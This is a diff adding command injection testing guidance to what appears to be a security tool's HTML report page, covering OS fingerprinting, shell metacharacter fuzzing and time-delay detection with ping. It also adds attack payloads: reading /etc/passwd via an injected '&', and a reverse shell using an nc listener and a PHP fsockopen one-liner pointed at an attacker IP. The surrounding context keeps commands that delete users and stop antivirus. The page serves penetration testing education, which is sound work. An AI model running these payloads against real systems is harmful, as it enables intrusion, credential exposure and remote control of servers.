@@ -12,8 +12,55 @@ in the expected way.
 <br/><br/>
 <span class="report-header">Discovery Methodology</span>
 <br/><br/>
+Look for pages that appear to execute system commands like ping, nslookup, traceroute or CGI scripts
+<br/><br/>
+Attempt to identify the operating system. For example HTTP Response vanity headers like 
+x-powered-by, Server, x-aspnet-version, etc. may infer operating system. Also look for clues
+such as ASP.NET runs on Windows exclusively and IIS version is tied directly to 
+operating system version. Try to cause an error since error messages often contain hints
+about the underlying operating system such as the direction of the file path separators.
+<br/><br/>
 Fuzz with command separators like ;, &amp; and &amp;&amp; depending on if
-you are using Linux or Windows respectively. Look for errors
+you are using Linux or Windows respectively. 
+<br/><br/>
+Fuzz with characters reserved in operating system shells
+<br/><br/>
+/bin/bash:	! # $ % & ' ( ) * + , - . / : ; < = < ? @ [ \ ] ^ _ { | } ~<br/>
+cmd.exe: 	% ^ & < > | ' ` , ; = ( ) ! ” [ ] . * ?
+<br/><br/>
+Also fuzz with non-alphanumeric ASCII characters and command injection values from Fuzz DB
+<br/><br/>
+Some vulnerable pages may not produce explicit output. Two methods may help detect 
+command injection vulnerabilities in these cases may be missing output or 
+time-delay inference
+<br/><br/>
+When fuzzing for command injection note when pages are missing output.
+In some cases an error caused by fuzzing for command injection may interupt the normal flow of execution.
+<br/>
+<ul>
+	<li>The site may suppress error messages resulting in neither normal output nor error output.<li/>
+	<li>The site may only display information from standard output (stdout) but not from the standard error 
+	file handle (stderr)</li>
+	<li>The injected value may halt execution of the shell command before the command can generate output</li>
+	<li>Use differential analysys to detect differences between a baseline response and other responses</li>
+</ul>
+By causing the response time of the increase measurably it may be possible to detect command injection without visible output
+Use time-delay inference comparing the average time of a normal response against an attacker chosen time delay.
+If the site is delayed as expected command injection has likely taken place.
+For example, if a page typically takes two second to load and an attacker injections a 
+command that takes 15 seconds to execute, a response time of 17 seconds implies a vulnerability
+<br/><br/>
+Time-delay inference should be attempted with commands most users are allowed to execute that 
+cause a predictable delay.
+ping may work well due to running in one second increments and being executable by 
+users on Windows and Linux against the loopback interface
+<br/><br/>
+Windows:	ping -n 15 127.0.0.1<br/>
+Linux:	ping -i 15 -c 2 127.0.0.1
+<br/><br/>
+Try prefixing and suffixing the injection with chaining characters ||, |, &&, &, `, <CRLF>, <LF>
+<br/><br/>
+Look for errors
 that are related to operating system errors, delays in responses
 which can be repeated by repeating the injection, or unexpected
 output in the response. The error may appear as an HTML comment.
@@ -86,6 +133,10 @@ Scanning: Enumerate Current user
 	Windows XP: &amp;&amp; set
 	Linux: &amp;&amp; whoami
 
+Scanning: Enumerate users
+
+	Linux: &amp; cat /etc/passwd
+	
 Scanning: Enumerate computers, users, groups, AD computers, AD users, AD groups
 
 	Windows XP: &amp;&amp; net view [/domain]
@@ -101,6 +152,16 @@ Gaining Access: Delete user
 
 	Windows XP: &amp;&amp; net user &lt;username&gt; /delete 
 
+Gaining Access: Reverse Bash Shell
+	
+	Linux: 
+	Determine the IP address of the attacking host.
+	Set up listener on attacker host such as nc -l -p 1234. 
+	Once listener set-up, ask web application server to connect back to attacker host.
+	Set IP address appropriately.
+	
+	www.google.com;php -r '$sock=fsockopen(&quot;&lt;IP&gt;&quot;,&lt;port&gt;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
+	
 Maintain Access: kill AV
 
 	net stop &lt;av process&gt;
